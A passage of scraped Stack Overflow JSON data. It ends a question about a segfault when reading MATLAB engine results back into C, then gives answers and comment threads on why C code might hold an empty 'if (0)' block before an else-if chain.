\n\n}\n</code></pre>\n\n<p>Now I send them to Matlab</p>\n\n<pre><code>engPutVariable(ep, \"xProcess\", xProcess);\nengPutVariable(ep, \"yProcess\", yProcess);\nengPutVariable(ep, \"xC\", xC);\nengPutVariable(ep, \"yC\", yC);\n\n\nfree(arrayTempxProcess);\nfree(arrayTempyProcess);\nfree(arrayTempxC);\nfree(arrayTempyC);\n</code></pre>\n\n<p>Now the Matlab function puts <code>NaN</code> in <code>xProcess</code> and <code>yProcess</code>, and fills <code>xC</code> and <code>yC</code>.</p>\n\n<pre><code>printf(\"Entering MATLAB \\n\");\nengEvalString(ep, \"[xProcess,yProcess,xC, yC] = my_matlab_function(xProcess,yProcess,xC, yC);\"); \nprintf(\"Leaving MATLAB \\n\");\n</code></pre>\n\n<p>Now comes trouble... Now I am trying to get the results... but the function <code>mxGetM(xC)</code> produces a segmentation fault in the first time step that I don't understand.</p>\n\n<pre><code>xC = engGetVariable(ep,\"xC\"); \nint mRowsC = mxGetM(xC);\n\n\ndouble *XC = NULL;\nXC = (double *)malloc (mRowsC*sizeof(double) );\nmemcpy(XC, mxGetData(xC),mRowsC*sizeof(double));\n\n\nyC = engGetVariable(ep,\"yC\");\ndouble *YC = NULL;\nYC = (double *)malloc (mmy*sizeof(double) );\nmemcpy(YC, mxGetData(yC),mmy*sizeof(double));\n\n\nxProcess = engGetVariable(ep,\"xProcess\"); \nint mRowsProcess = mxGetM(xProcess);\n\n\ndouble *XPROCESS = NULL;\nXPROCESS = (double *)malloc (mRowsProcess*sizeof(double) );\nmemcpy(XPROCESS, mxGetData(xPROCESS),mRowsProcess*sizeof(double));\n\n\nyProcess = engGetVariable(ep,\"yProcess\");\n\ndouble *YPROCESS = NULL;\nPROCESS = (double *)malloc (mRowsProcess*sizeof(double) );\nmemcpy(YPROCESS, mxGetData(yProcess),mRowsProcess*sizeof(double));\n\n\n\nnumberC = mRowsC;\n\nmxDestroyArray(xProcess);\nmxDestroyArray(yProcess);\nmxDestroyArray(xC);\nmxDestroyArray(yC);\nfree(XPROCESS);\nfree(YPROCESS);\nfree(XC);\nfree(YC);\n}\n}\n</code></pre>\n\n<p>I have tried to reduce the number of elements in <code>xProcess</code> and <code>yProcess</code> but I get the segmentation fault at some point later than the first time step.\nThe weird thing about this, is that I also tried to save the results in Matlab after <code>printf(\"Leaving MATLAB \\n\");</code> but it didn't work out. It saved nothing.</p>\n\n<p>I'm new coupling C and Matlab, so my code might be entirely wrong, but is there any limits in which C cannot be coupled with Matlab functions?</p>\n\n<p>Any help is appreciated. Thanks!</p>\n"}, {"tags": ["c", "if-statement"], "comments": [{"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "edited": false, "score": 2, "creation_date": 1542361089, "post_id": 53298646, "comment_id": 93549144, "body": "That statement seems irrelevant. Generate assembly code with and without that statement and you will see what is going under the hood."}, {"owner": {"reputation": 48100, "user_id": 645551, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/3231cd5016283f6ea5963ab1dfa6e27a?s=128&d=identicon&r=PG", "display_name": "freakish", "link": "https://stackoverflow.com/users/645551/freakish"}, "edited": false, "score": 2, "creation_date": 1542370781, "post_id": 53298646, "comment_id": 93554276, "body": "It&#39;s possible this is an automatically generated code."}], "answers": [{"comments": [{"owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "edited": false, "score": 0, "creation_date": 1542193839, "post_id": 53298823, "comment_id": 93478369, "body": "If there is an <code>if else</code> then the if(0) may make sense, but for <code>if, else if</code> I fail to see the reason."}, {"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "reply_to_user": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "edited": false, "score": 0, "creation_date": 1542193908, "post_id": 53298823, "comment_id": 93478425, "body": "@RishikeshRaje Again: to be able to exchange some parts without having to change the lines."}, {"owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "edited": false, "score": 0, "creation_date": 1542194050, "post_id": 53298823, "comment_id": 93478514, "body": "That may be a possible use case, maybe in cases where there are many <code>else if</code> conditions, say greater than 10,"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 240, "creation_date": 1542194124, "post_id": 53298823, "comment_id": 93478546, "body": "Personal opinion: While this may be the reason code why it is written as it is, I think it&#39;s a bad justification. Code is read more often than it&#39;s written, and this unnecessary code just increases parsing overhead for the reader."}, {"owner": {"reputation": 1413, "user_id": 1766364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dNwBh.png?s=128&g=1", "display_name": "Zzaponka", "link": "https://stackoverflow.com/users/1766364/zzaponka"}, "edited": false, "score": 1, "creation_date": 1542194493, "post_id": 53298823, "comment_id": 93478764, "body": "@PSkocik, thanks for the idea. Just didn&#39;t think that this can be used only for convenience. For now, your answer is most helpful, so I chose it as a solution."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 13, "creation_date": 1542194738, "post_id": 53298823, "comment_id": 93478902, "body": "@user694733: You could argue that the common <code>if else</code> prefix to all significant code paths lines the conditions up nicely and makes scaning them easier. (That&#39;s subjective, though, and would depend a lot of what&#39;s really inside the conditions and code blocks.)"}, {"owner": {"reputation": 1413, "user_id": 1766364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dNwBh.png?s=128&g=1", "display_name": "Zzaponka", "link": "https://stackoverflow.com/users/1766364/zzaponka"}, "edited": false, "score": 1, "creation_date": 1542201491, "post_id": 53298823, "comment_id": 93482778, "body": "@PSkocik, indeed, as Lundin mentioned in the comment under the question itself, it would be a nice idiom in defensive programming, which allows you to throw this &#39;if (0)&#39; in the beginning, default &#39;unhandled&#39; case in the end and then joggle with meaningful branches inside."}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 72, "creation_date": 1542203580, "post_id": 53298823, "comment_id": 93484205, "body": "I don&#39;t think <code>if (0) {..}</code> introduces any parsability/readability problem. It should be obvious to anyone who knows a bit of C. That&#39;s not an issue. The problem is the follow-up question after reading it: &quot;What the hell is it for then?&quot; Unless it&#39;s for debugging/temporary purposes (i.e., the intention is to &quot;enable&quot; that <code>if</code> block later), I&#39;d advocate <i>removing</i> altogether. Basically &quot;reading&quot; such code would likely cause an unnecessary &quot;pause&quot; for the reader for no good reason. And that&#39;s a good enough a reason to remove it."}, {"owner": {"reputation": 2149, "user_id": 2096401, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uVjii.jpg?s=128&g=1", "display_name": "TripeHound", "link": "https://stackoverflow.com/users/2096401/tripehound"}, "edited": false, "score": 2, "creation_date": 1542206586, "post_id": 53298823, "comment_id": 93486186, "body": "It particularly, a leading <code>if( 0 )</code> can help &quot;<i>aesthetically</i>&quot; if the <code>else if</code> entries are all single lines... e.g. a sequence of <code>else if( conditonA() ) actionA() ;</code> ... <code>else if( conditonE() ) actionE() ;</code> lines (with or without braces, as you see fit)."}, {"owner": {"reputation": 1578, "user_id": 6822618, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/GapDl.jpg?s=128&g=1", "display_name": "JAD", "link": "https://stackoverflow.com/users/6822618/jad"}, "edited": false, "score": 2, "creation_date": 1542207434, "post_id": 53298823, "comment_id": 93486773, "body": "Another reason someone might do this is so they can comment and uncomment the different ifelse statements without breaking. I heard a similar tactic used in SQL: <code>where 1 = 1</code> and then <code>and statement</code> on other lines."}, {"owner": {"reputation": 50669, "user_id": 1711796, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6pRI7.png?s=128&g=1", "display_name": "Bernhard Barker", "link": "https://stackoverflow.com/users/1711796/bernhard-barker"}, "edited": false, "score": 1, "creation_date": 1542209659, "post_id": 53298823, "comment_id": 93488170, "body": "It would be trivial to swap if-statements around if you just move the parts from <code>if</code> to <code>else</code>, no? (As in select from <code>if</code> to <code>else</code> and move it to before another <code>if</code> or after another <code>else</code>). <i>Slightly</i> more effort than moving entire lines at a time, but it&#39;s still just a single copy-and-paste or drag."}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "edited": false, "score": 0, "creation_date": 1542227857, "post_id": 53298823, "comment_id": 93497446, "body": "This question&#39;s been getting way too much attention :D. <code>if (0) {}</code> or no <code>if (0){}</code>, it&#39;s no big deal and doesn&#39;t really matter. On to solving actual problems :). (People definitely do seem to love bikeshedding :) )"}, {"owner": {"reputation": 378, "user_id": 879619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a069f5481059769e9c7a2f88641c02c0?s=128&d=identicon&r=PG", "display_name": "Vectorjohn", "link": "https://stackoverflow.com/users/879619/vectorjohn"}, "edited": false, "score": 77, "creation_date": 1542232732, "post_id": 53298823, "comment_id": 93499521, "body": "Seems like it definitely detracts from readability. It was so bad it sent that programmer to SO to ask what it was for. Not a good sign."}, {"owner": {"reputation": 43407, "user_id": 2791540, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/bbd133916bdbabcde7c31ab28f4b4e6b?s=128&d=identicon&r=PG&f=1", "display_name": "John Wu", "link": "https://stackoverflow.com/users/2791540/john-wu"}, "edited": false, "score": 26, "creation_date": 1542253466, "post_id": 53298823, "comment_id": 93504865, "body": "Even using this pattern, I don&#39;t know if you can &quot;move <code>else if</code> around the editor without worry&quot; because the conditions may not be mutually exclusive, in which case <i>order</i> matters. Personally I would use only <code>if</code>, and perform <a href=\"https://softwareengineering.stackexchange.com/questions/18454/should-i-return-from-a-function-early-or-use-an-if-statement\">early return</a>, extracting the logic chain to a separate function if necessary."}, {"owner": {"reputation": 696, "user_id": 2389310, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/oIQS1.png?s=128&g=1", "display_name": "Mo\u0142ot", "link": "https://stackoverflow.com/users/2389310/mo%c5%82ot"}, "reply_to_user": {"reputation": 43407, "user_id": 2791540, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/bbd133916bdbabcde7c31ab28f4b4e6b?s=128&d=identicon&r=PG&f=1", "display_name": "John Wu", "link": "https://stackoverflow.com/users/2791540/john-wu"}, "edited": false, "score": 1, "creation_date": 1542293233, "post_id": 53298823, "comment_id": 93524092, "body": "@JohnWu conditions not being mutually exclusive, and being order-dependent is the very reason of keeping them easy to reorder. If order doesn&#39;t matter, you will not need to reorder. If it does, you may need to. Also, the quote now says <i>&quot;without having to mind the first if&quot;</i>, not <i>&quot;without worry&quot;</i>."}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "reply_to_user": {"reputation": 696, "user_id": 2389310, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/oIQS1.png?s=128&g=1", "display_name": "Mo\u0142ot", "link": "https://stackoverflow.com/users/2389310/mo%c5%82ot"}, "edited": false, "score": 2, "creation_date": 1542293368, "post_id": 53298823, "comment_id": 93524185, "body": "@Mo\u0142ot It never said &quot;without worry.&quot; In C, one must always worry :D."}, {"owner": {"reputation": 1832, "user_id": 3476849, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/5gbS7.png?s=128&g=1", "display_name": "kasperd", "link": "https://stackoverflow.com/users/3476849/kasperd"}, "reply_to_user": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1542304028, "post_id": 53298823, "comment_id": 93530825, "body": "@user694733 It&#39;s true that code is read more often than it is written. However there is another considerations one must not forget. That&#39;s how often you read the diff in a commit to update the code. Both the diffs and the code itself is expected to be read more often than it is written. Sometimes you have a choice between making the diffs readable and making the code readable. If a small change in code style can make diffs more readable, then that is worth it. A style which makes diffs more readable also tend to reduce the frequency of merge conflicts."}, {"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "reply_to_user": {"reputation": 25726, "user_id": 453435, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/SjPwA.jpg?s=128&g=1", "display_name": "Ben Leggiero", "link": "https://stackoverflow.com/users/453435/ben-leggiero"}, "edited": false, "score": 0, "creation_date": 1544646438, "post_id": 53298823, "comment_id": 94354380, "body": "@Supuhstar - do you have an editor where, if you delete an initial <code>if(cond)</code> in a cascaded <code>if(cond1){code1} else if(cond2){ code2 } ... else{codeElse }</code>, it automatically deletes the <code>if(cond1){code1}</code> and converts <code>else if(cond2){</code> into <code>if(cond2){</code> ?  If so, what editor? // Actually, I suppose that I am already using such an editor, in one of EMACS numerous modes.  But I confess to falling back to text editing, just plain deleting the lines, a lot."}, {"owner": {"reputation": 25726, "user_id": 453435, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/SjPwA.jpg?s=128&g=1", "display_name": "Ben Leggiero", "link": "https://stackoverflow.com/users/453435/ben-leggiero"}, "reply_to_user": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "edited": false, "score": 0, "creation_date": 1544655206, "post_id": 53298823, "comment_id": 94358060, "body": "@KrazyGlew I select from before <code>if</code> to before <code>else</code> and press delete"}, {"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "reply_to_user": {"reputation": 25726, "user_id": 453435, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/SjPwA.jpg?s=128&g=1", "display_name": "Ben Leggiero", "link": "https://stackoverflow.com/users/453435/ben-leggiero"}, "edited": false, "score": 0, "creation_date": 1544771446, "post_id": 53298823, "comment_id": 94401171, "body": "@Supuhstar: sounds like you select using mouse? Slow!"}, {"owner": {"reputation": 25726, "user_id": 453435, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/SjPwA.jpg?s=128&g=1", "display_name": "Ben Leggiero", "link": "https://stackoverflow.com/users/453435/ben-leggiero"}, "reply_to_user": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "edited": false, "score": 0, "creation_date": 1544969194, "post_id": 53298823, "comment_id": 94454425, "body": "@KrazyGlew either my large external trackpad or mechanical keyboard. Since it&#39;s a gesture I do so often, it&#39;s become subconscious and fast. It&#39;s also easy to bind to a Regex-based macro \ud83d\ude1c. But, comments are not for extended discussion. If you wanna continue this discussion, my contact methods are listed at <a href=\"https://mastodon.social/@Supuhstar\" rel=\"nofollow noreferrer\">mastodon.social/@Supuhstar</a>"}], "tags": [], "owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "is_accepted": true, "score": 92, "last_activity_date": 1542268162, "last_edit_date": 1542268162, "creation_date": 1542193782, "answer_id": 53298823, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53298823#53298823", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>I sometimes use this for symmetry so I can move the other <code>else if{</code> freely around with my editor without having to mind the first <code>if</code>.</p>\n\n<p>Semantically the</p>\n\n<pre><code>if (0) {\n    // Empty braces\n} else \n</code></pre>\n\n<p>part doesn't do anything and you can count on optimizers to delete it.</p>\n"}, {"tags": [], "owner": {"reputation": 9716, "user_id": 1116739, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de7dd5d55de3e76fd4ca0916028e2d46?s=128&d=identicon&r=PG", "display_name": "cha0site", "link": "https://stackoverflow.com/users/1116739/cha0site"}, "is_accepted": false, "score": 6, "last_activity_date": 1542193964, "creation_date": 1542193964, "answer_id": 53298884, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53298884#53298884", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>I think it's just bad code. Writing a quick example in Compiler Explorer, we see that in both gcc and clang no code is generated for the <code>if (0)</code> block, even with optimizations completely disabled:</p>\n\n<p><a href=\"https://godbolt.org/z/PETIks\" rel=\"noreferrer\">https://godbolt.org/z/PETIks</a></p>\n\n<p>Playing around with removing the <code>if (0)</code> causes no changes to the generated code, so I conclude that this is not an optimization.</p>\n\n<p>It's possible that there used to be something in the top <code>if</code> block which was later removed. In short, it looks like removing it would cause the exact same code to be generated, so feel free to do that.</p>\n"}, {"comments": [{"owner": {"reputation": 2006, "user_id": 2713852, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/NAHcS.jpg?s=128&g=1", "display_name": "David Szalai", "link": "https://stackoverflow.com/users/2713852/david-szalai"}, "edited": false, "score": 3, "creation_date": 1542210005, "post_id": 53298917, "comment_id": 93488406, "body": "Isn&#39;t <code>if(0)</code> decrease branch coverage too?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 2006, "user_id": 2713852, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/NAHcS.jpg?s=128&g=1", "display_name": "David Szalai", "link": "https://stackoverflow.com/users/2713852/david-szalai"}, "edited": false, "score": 1, "creation_date": 1542210081, "post_id": 53298917, "comment_id": 93488445, "body": "@DavidSzalai Not completely - at most it will decrease by 1 (from previous 2) - but one hit will still be required for coverage, to the best of my knowledge."}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 16, "last_activity_date": 1542471304, "last_edit_date": 1542471304, "creation_date": 1542194050, "answer_id": 53298917, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53298917#53298917", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>I am not sure of any optimizations, but my two cents: </p>\n\n<p>This happened because of some code modification, where one primary condition was removed, (the function call in initial <code>if</code> block, let's say), but the developers/ maintainers </p>\n\n<ul>\n<li>were <em>lazy</em> to restructure the <code>if-else</code> block</li>\n<li>did not want to go down on the <a href=\"https://en.wikipedia.org/wiki/Code_coverage\" rel=\"noreferrer\">branch coverage count</a></li>\n</ul>\n\n<p>so instead of removing the associated <code>if</code> block, they simply changed the condition to <code>if(0)</code> and moved on.</p>\n"}, {"tags": [], "owner": {"reputation": 149, "user_id": 3672418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac979d233ba2722b99b65c727f6f6e5b?s=128&d=identicon&r=PG&f=1", "display_name": "sergiopm", "link": "https://stackoverflow.com/users/3672418/sergiopm"}, "is_accepted": false, "score": 6, "last_activity_date": 1542202762, "last_edit_date": 1542202762, "creation_date": 1542194882, "answer_id": 53299163, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53299163#53299163", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>As it's been said, the zero is evaluated to false, and the branch will likely be optimized out by the compiler.</p>\n\n<p>I've also seen this before in code where a new feature was added and a kill-switch was needed (if something goes wrong with the feature you can just turn it off), and some time later when the kill-switch was removed the programmer didn't also remove the branch, e.g.</p>\n\n<pre><code>if (feature_a_active()) {\n    use_feature_a();\n} else if (some_fn()) {\n   ...\n</code></pre>\n\n<p>became</p>\n\n<pre><code>if (0) {\n   // empty\n} else if (some_fn()) {\n   ...\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 84731, "user_id": 510937, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/70b13a9ae1aae1ca1aa6ac8dab4643f2?s=128&d=identicon&r=PG", "display_name": "Bakuriu", "link": "https://stackoverflow.com/users/510937/bakuriu"}, "edited": false, "score": 4, "creation_date": 1542229690, "post_id": 53304256, "comment_id": 93498198, "body": "The <code>1=1</code> is also &quot;useful&quot; because you can always add the <code>where</code> in front, unconditionally. Otherwise you&#39;d have to check if it&#39;s empty, and if so avoid generating the <code>where</code> clause."}, {"owner": {"reputation": 5760, "user_id": 1863564, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/XU4XS.png?s=128&g=1", "display_name": "Fund Monica&#39;s Lawsuit", "link": "https://stackoverflow.com/users/1863564/fund-monicas-lawsuit"}, "edited": false, "score": 2, "creation_date": 1542232512, "post_id": 53304256, "comment_id": 93499404, "body": "In addition, most databases will automatically &quot;remove&quot; the <code>1=1</code> from the <code>WHERE</code>, so it doesn&#39;t have an impact on performance."}, {"owner": {"reputation": 196, "user_id": 6575703, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a3ab140fa37f43375ce560532c669ba3?s=128&d=identicon&r=PG", "display_name": "phagio", "link": "https://stackoverflow.com/users/6575703/phagio"}, "edited": false, "score": 7, "creation_date": 1542285138, "post_id": 53304256, "comment_id": 93519102, "body": "This is acceptable in a library that automatically generates SQL queries that are most likely never seen even by the DevOps team. It&#39;s not &quot;acceptable&quot; in high-level code that has to be written and read multiple times."}, {"owner": {"reputation": 766, "user_id": 4241435, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/EZF4i.jpg?s=128&g=1", "display_name": "Skipper", "link": "https://stackoverflow.com/users/4241435/skipper"}, "edited": false, "score": 0, "creation_date": 1542370925, "post_id": 53304256, "comment_id": 93554334, "body": "This is really handy approach when generating some kind of <b>dynamic SQL</b> with unknown number of final conditions."}, {"owner": {"reputation": 48100, "user_id": 645551, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/3231cd5016283f6ea5963ab1dfa6e27a?s=128&d=identicon&r=PG", "display_name": "freakish", "link": "https://stackoverflow.com/users/645551/freakish"}, "reply_to_user": {"reputation": 196, "user_id": 6575703, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a3ab140fa37f43375ce560532c669ba3?s=128&d=identicon&r=PG", "display_name": "phagio", "link": "https://stackoverflow.com/users/6575703/phagio"}, "edited": false, "score": 0, "creation_date": 1542371449, "post_id": 53304256, "comment_id": 93554591, "body": "@phagio What makes you think that generated code has to be written or read? E.g. who reads/modifies google protobuf generated code?"}, {"owner": {"reputation": 196, "user_id": 6575703, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a3ab140fa37f43375ce560532c669ba3?s=128&d=identicon&r=PG", "display_name": "phagio", "link": "https://stackoverflow.com/users/6575703/phagio"}, "reply_to_user": {"reputation": 48100, "user_id": 645551, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/3231cd5016283f6ea5963ab1dfa6e27a?s=128&d=identicon&r=PG", "display_name": "freakish", "link": "https://stackoverflow.com/users/645551/freakish"}, "edited": false, "score": 1, "creation_date": 1542375682, "post_id": 53304256, "comment_id": 93556900, "body": "@freakish indeed I wrote the opposite: poorly readable syntax is acceptable in generated code since it will most likely never be read, not in high-level functional code that is maintained by developers."}, {"owner": {"reputation": 48100, "user_id": 645551, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/3231cd5016283f6ea5963ab1dfa6e27a?s=128&d=identicon&r=PG", "display_name": "freakish", "link": "https://stackoverflow.com/users/645551/freakish"}, "reply_to_user": {"reputation": 196, "user_id": 6575703, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a3ab140fa37f43375ce560532c669ba3?s=128&d=identicon&r=PG", "display_name": "phagio", "link": "https://stackoverflow.com/users/6575703/phagio"}, "edited": false, "score": 0, "creation_date": 1542375836, "post_id": 53304256, "comment_id": 93556974, "body": "@phagio Oh, ok, I get it now."}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "reply_to_user": {"reputation": 48100, "user_id": 645551, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/3231cd5016283f6ea5963ab1dfa6e27a?s=128&d=identicon&r=PG", "display_name": "freakish", "link": "https://stackoverflow.com/users/645551/freakish"}, "edited": false, "score": 0, "creation_date": 1542379684, "post_id": 53304256, "comment_id": 93559127, "body": "@freakish I once had to deal with a bug that was a result of a series of modifications people had made to an auto-generated file.  The changes themselves worked well enough for a couple years, I guess, but then when more changes needed to be made, I used the actual tool that auto-generated the file, which would first parse the old file to figure out the project settings.  Unfortunately the changes did not play well with the tool&#39;s parser.  Took awhile to figure out the evil that had been done."}, {"owner": {"reputation": 48100, "user_id": 645551, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/3231cd5016283f6ea5963ab1dfa6e27a?s=128&d=identicon&r=PG", "display_name": "freakish", "link": "https://stackoverflow.com/users/645551/freakish"}, "reply_to_user": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 0, "creation_date": 1542379777, "post_id": 53304256, "comment_id": 93559183, "body": "@ChristianGibbons That&#39;s exactly my point: if you do autogeneration then you should not mess with autogenerated code. I know that such things happen. But its risky."}], "tags": [], "owner": {"reputation": 8519, "user_id": 444610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0933cdf369cd867942b8b5e752970c17?s=128&d=identicon&r=PG", "display_name": "Seth Flowers", "link": "https://stackoverflow.com/users/444610/seth-flowers"}, "is_accepted": false, "score": 45, "last_activity_date": 1542211268, "creation_date": 1542211268, "answer_id": 53304256, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53304256#53304256", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>I've seen a similar pattern used in generated code. For example, in 